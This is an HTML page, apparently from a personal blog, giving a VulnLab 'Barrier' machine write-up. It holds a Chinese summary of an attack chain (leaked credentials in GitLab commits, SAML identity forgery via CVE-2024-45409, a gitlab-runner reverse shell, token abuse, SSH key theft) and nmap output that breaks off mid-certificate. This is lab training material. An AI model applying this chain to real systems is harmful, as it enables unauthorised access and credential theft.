@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;8ffa1a3b-cbd4-41ce-8d8d-ca53e59ef094 首先，發現了一個公開的 GitLab 項目，通過查看其提交歷史，獲得了用戶 satoru 的賬號和密碼。接著，利用這些憑證成功登錄到一個運行在 9000 端口的 authentik 服務，這是一個單一登入（SSO）系統。通過這個系統，進一步">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Barrier">
+<meta property="og:url" content="https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;8ffa1a3b-cbd4-41ce-8d8d-ca53e59ef094 首先，發現了一個公開的 GitLab 項目，通過查看其提交歷史，獲得了用戶 satoru 的賬號和密碼。接著，利用這些憑證成功登錄到一個運行在 9000 端口的 authentik 服務，這是一個單一登入（SSO）系統。通過這個系統，進一步">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100358-0pzhs8d.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065403-b150coc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065419-saeqkap.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065438-5n0vmiv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065456-u22afqi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065532-l8cdbkl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065615-xzpxlss.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065642-c2ldjjm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065850-z40kt7r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075943-z9d1cdf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111073141-whjxpq5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111073301-lrkapdb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111073339-cgjb1oq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111074953-br0gw9l.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075116-u1261gd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075124-gdoujrs.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075925-krzv3q2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075828-fapnni3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111080025-om9lrs5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111080054-xelv927.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111081432-05xjw5q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111081447-91onqtw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111081416-y6mpo48.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/demo1-20250111082213-s7468h2.gif">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082517-h9zf4vm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082536-3uod89z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082614-ee6sawb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111083633-o3p2q3y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082708-b5506i3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111083933-wndj2hv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111083950-iyscfe6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090515-yt2tvjm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090533-vrawpqv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090559-6zakmqo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090054-49dhffr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111092111-wess4lb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111092529-paka7yk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111092556-8cuffls.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093014-4fk2viz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093246-ddcff4r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093409-sge755l.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093451-7q49qu3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093930-wp6iq8y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093501-v46tve7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094205-77ph7p2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094224-bll9og8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094245-j4ud0ry.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094306-k0xn410.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094323-p0e845i.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094500-ici0l2r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100546-4riafs9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111095308-mrisq9r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111095431-kdpjqqi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100216-43qrkpq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111095709-rbpkwwl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100152-3t3wrlb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100441-r02xyo0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100346-fsmilgc.png">
+<meta property="article:published_time" content="2025-01-11T02:39:11.000Z">
+<meta property="article:modified_time" content="2025-01-19T03:04:34.342Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100358-0pzhs8d.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Barrier</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/18/2025/16-vulnlab-Bruno/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/06/2025/14-vulnlab-Breach/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&text=VulnLab - Machine - Barrier"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&is_video=false&description=VulnLab - Machine - Barrier"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Barrier&body=Check out this article: https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&name=VulnLab - Machine - Barrier&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&t=VulnLab - Machine - Barrier"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Barrier
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-11T02:39:11.000Z" class="dt-published" itemprop="datePublished">2025-01-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100358-0pzhs8d.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=8ffa1a3b-cbd4-41ce-8d8d-ca53e59ef094">https://api.vulnlab.com/api/v1/share?id=8ffa1a3b-cbd4-41ce-8d8d-ca53e59ef094</a></p>
+<p>首先，發現了一個公開的 GitLab 項目，通過查看其提交歷史，獲得了用戶 satoru 的賬號和密碼。接著，利用這些憑證成功登錄到一個運行在 9000 端口的 authentik 服務，這是一個單一登入（SSO）系統。通過這個系統，進一步進入了 GitLab，並發現了其版本信息。利用這些信息，搜索到了相關的漏洞 CVE-2024-45409，這是一個涉及 Ruby SAML 庫的漏洞，允許攻擊者偽造任意用戶身份。為了利用這個漏洞，嘗試偽造 GitLab 管理員 akadmin 的身份，並成功登錄。進入後，發現 GitLab 部署了一個暫停的 gitlab-runner，通過啟動它並創建一個自動化腳本，獲得了一個反向 shell，從而進一步探索系統內部。接下來，發現了一個管理員權限的 AUTHENTIK_TOKEN，並利用它修改了 authentik 管理員的密碼，成功進入後台。最終，通過分析 Guacamole 的配置文件，找到了 maki_adm 用戶的 SSH 密鑰，並成功登錄，獲得了更高的系統權限。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE             REASON         VERSION</span><br><span class="line">22/tcp   open  ssh                 syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 f3:6c:aa:fe:2c:20:f6:55:a0:5b:61:54:cf:39:17:d0 (RSA)</span><br><span class="line">|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOokCfPYcz8TQuTM23sE/xAyy0Vvl+Wg4aM7iDOolVIkn0qKiJVyxDqfYAo35Q7A+UCcCMB0j9iKGUsiUGCReEAli2sTj59DI5fco6eSz3HBaxTEt7cLZywL3fTT6SuTZtzcLbU5aoOy+H/nCKFK2jf29FWQVWzSAz5wdQgMtukRPBSpcr/L8dzAJWwDBR2ohSU1MHHU0thVA+MEHxyjuGFTdGfzBGcEq/MXIsd/i5y3sXFJ0eclgjLE7pkbOdS27+rat9kJokedWMoEfA1KeY6OYrSihdV6btYI7j12S8yR4Wr/OPcC1Na0gx5d+q2aJs12PH8uR0hIGnUzNtyzPxMBiX1AgBq81omtFDhkdXBPNOMphLEPTqdfRTEhEjHkvMK89rhW55A3F1iETyzMQ/d6DMmiBipVi37xu3XfaztYWnMFEzS56oJA+LjWRI0dy29V+yD0kk36XvRIhdQ7CAgCTJ8u/3fvA5ShWoGtOoV/gNO2VMq3weycg9Oombou0=</span><br><span class="line">80/tcp   open  http                syn-ack ttl 62 nginx</span><br><span class="line">|_http-title: Did not follow redirect to https://gitlab.barrier.vl:443/</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">443/tcp  open  ssl/http            syn-ack ttl 62 nginx</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-title: Sign in \xC2\xB7 GitLab</span><br><span class="line">|_Requested resource was https://10.10.81.162/users/sign_in</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 66F9A1C3F2CFD0DF1B570990E86D3095</span><br><span class="line">| http-robots.txt: 58 disallowed entries (40 shown)</span><br><span class="line">| / /autocomplete/users /autocomplete/projects /search</span><br><span class="line">| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile</span><br><span class="line">| /-/user_settings/profile /-/ide/ /-/experiment /*/new /*/edit /*/raw</span><br><span class="line">| /*/realtime_changes /groups/*/analytics</span><br><span class="line">| /groups/*/contribution_analytics /groups/*/group_members /groups/*/-/saml/sso</span><br><span class="line">| /*/*.git$ /*/archive/ /*/repository/archive* /*/activity</span><br><span class="line">| /*/blame /*/commits /*/commit /*/commit/*.patch</span><br><span class="line">| /*/commit/*.diff /*/compare /*/network /*/graphs</span><br><span class="line">| /*/merge_requests/*.patch /*/merge_requests/*.diff /*/merge_requests/*/diffs</span><br><span class="line">|_/*/deploy_keys /*/hooks</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">| ssl-cert: Subject: commonName=gitlab.barrier.vl/organizationName=Mycompany/stateOrProvinceName=GD/countryName=CN/localityName=SZ</span><br><span class="line">| Subject Alternative Name: DNS:gitlab.barrier.vl</span><br><span class="line">| Issuer: commonName=Barrier Root CA/organizationName=Mycompany/stateOrProvinceName=GD/countryName=CN/localityName=SZ</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-12-15T16:52:03</span><br><span class="line">| Not valid after:  2025-12-15T16:52:03</span><br><span class="line">| MD5:   0b50:8a55:99c7:55fe:bf36:3f26:3c76:82cd</span><br><span class="line">| SHA-1: c0a2:f404:0136:e8e5:3578:99f7:246b:f136:fa64:5187</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIDWjCCAkKgAwIBAgIUAUyxSLcW6CmTYJDScO1lhes0KvIwDQYJKoZIhvcNAQEL</span><br><span class="line">| BQAwVTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjESMBAG</span><br><span class="line">| A1UECgwJTXljb21wYW55MRgwFgYDVQQDDA9CYXJyaWVyIFJvb3QgQ0EwHhcNMjQx</span><br><span class="line">| MjE1MTY1MjAzWhcNMjUxMjE1MTY1MjAzWjBXMQswCQYDVQQGEwJDTjELMAkGA1UE</span><br><span class="line">| CAwCR0QxCzAJBgNVBAcMAlNaMRIwEAYDVQQKDAlNeWNvbXBhbnkxGjAYBgNVBAMM</span><br><span class="line">| EWdpdGxhYi5iYXJyaWVyLnZsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC</span><br><span class="line">| AQEAozNeLDYPk6cuP+7dcQ+l7g+5FXNDvg00nPqtkK9rH7ACxgvVLTTacvQU7yNv</span><br><span class="line">| ZAdrgwDOtSzsfzCtTKiqhJYDqjSyLI/9BFnz4LObVlUd1wnhHk5nVLB63JiTGIDW</span><br><span class="line">| M727dbWgUzVT/MK+L7IZ/DnQFI4Fw5czKZ7qU7mQkoscrFQvaPi1xpX+RLiatZnM</span><br><span class="line">| y3baG+crsDTk26dEOaCt83kFrjUFLTUNjEE9po0eQK3kIAnfmmA4XTn3rn+Rny4T</span><br><span class="line">| M/PvjcBwC0xakVc4yhZwf/vx0P8wPZTrZaPVBnnDvbrs7b0EN/0wK6mTq21HuyzY</span><br><span class="line">| 